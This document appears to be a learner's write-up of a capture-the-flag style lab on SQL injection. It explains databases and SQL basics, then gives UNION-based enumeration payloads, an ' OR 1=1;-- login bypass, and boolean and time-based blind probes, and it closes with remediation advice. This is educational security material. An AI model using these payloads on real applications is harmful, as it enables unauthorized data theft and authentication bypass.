# SQL Injection

## Task 1: Brief

SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated, there is the potential for an attacker to steal, delete, or alter private and customer data and attack the web application authentication methods to private or customer areas. This is why SQLi is one of the oldest web application vulnerabilities and also one of the most damaging.

## Task 2: What is a Database?

![](https://github.com/user-attachments/assets/eaa2be93-3b5a-465d-a266-6ef40840c927)
![](https://github.com/user-attachments/assets/74101a7f-ae47-4767-ad50-19c9bf9127aa)

A database is an organized collection of data controlled by a Database Management System (DBMS). DBMSs can be Relational (SQL-based, structured in tables with rows and columns) or Non-Relational (NoSQL, flexible structure).

- Relational databases: MySQL, PostgreSQL, Microsoft SQL Server
- Non-Relational databases: MongoDB, Cassandra

Tables in relational databases have rows (records) and columns (fields). Columns define data types such as integers, strings, or dates. Rows store actual data entries.

## Task 3: What is SQL?

SQL (Structured Query Language) is used for interacting with databases through statements:

### SELECT
Retrieve data from a database:

```sql
SELECT * FROM users;
SELECT username, password FROM users;
SELECT * FROM users LIMIT 1;
SELECT * FROM users WHERE username='admin';
```

### UNION
Combine results from multiple SELECT statements:

```sql
SELECT name FROM customers UNION SELECT name FROM suppliers;
```

### INSERT
Insert data into a database:

```sql
INSERT INTO users (username, password) VALUES ('bob', 'password123');
```

### UPDATE
Update data within a database:

```sql
UPDATE users SET username='root' WHERE username='admin';
```

### DELETE
Delete data from a database:

```sql
DELETE FROM users WHERE username='martin';
```

## Task 4: What is SQL Injection?

SQL Injection occurs when user-supplied data is used directly in SQL queries without validation:

Example URL:

```
https://website.thm/blog?id=1;--
```

Injected Query:

```sql
SELECT * FROM blog WHERE id=1;-- and private=0 LIMIT 1;
```

## Task 5: In-Band SQL Injection

Two types:
- Error-Based SQL Injection: Leverages error messages to enumerate databases.
- Union-Based SQL Injection: Uses UNION statements to extract additional data.

Example payload:

```sql
0 UNION SELECT 1,2,database();
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one';
```

## Task 6: Blind SQL Injection - Authentication Bypass

Authentication bypass using a condition that always returns true:

```sql
' OR 1=1;--
```

## Task 7: Blind SQL Injection - Boolean Based

Boolean-based SQLi uses conditional queries and checks the true/false response to extract data:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```

## Task 8: Blind SQL Injection - Time-Based

Time-based SQLi introduces delays to indicate successful queries:

```sql
admin123' UNION SELECT SLEEP(5),2;--
```

## Task 9: Out-of-Band SQL Injection

Uses external communication channels (HTTP/DNS) to extract data indirectly.

![](https://github.com/user-attachments/assets/7ce65b17-4094-4cd7-9d99-14d13bf96ce7)

## Task 10: Remediation

Methods to protect from SQLi:
- Prepared Statements
- Input Validation
- Escaping User Input
